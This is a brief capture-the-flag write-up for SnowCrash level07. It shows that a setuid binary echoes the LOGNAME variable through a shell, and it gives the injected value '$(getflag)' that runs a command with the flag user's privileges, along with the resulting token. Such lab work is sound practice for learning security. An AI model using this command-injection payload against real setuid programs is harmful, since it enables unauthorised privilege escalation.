# Flag 07

In the level07 home directory we found a binary file `level07` owned by flag07 we executed the binary and it printed the filename `level07`
```
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

we used binary ninja to see waht the binary doing, and it's just calling /bin/echo and echoing the variable envirenment `LOGNAME`
so we just changed the LOGNAME vaiable content to execute the `getflag` command as FLAG07

```
level07@SnowCrash:~$ export LOGNAME="\$(getflag)"
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$ 

```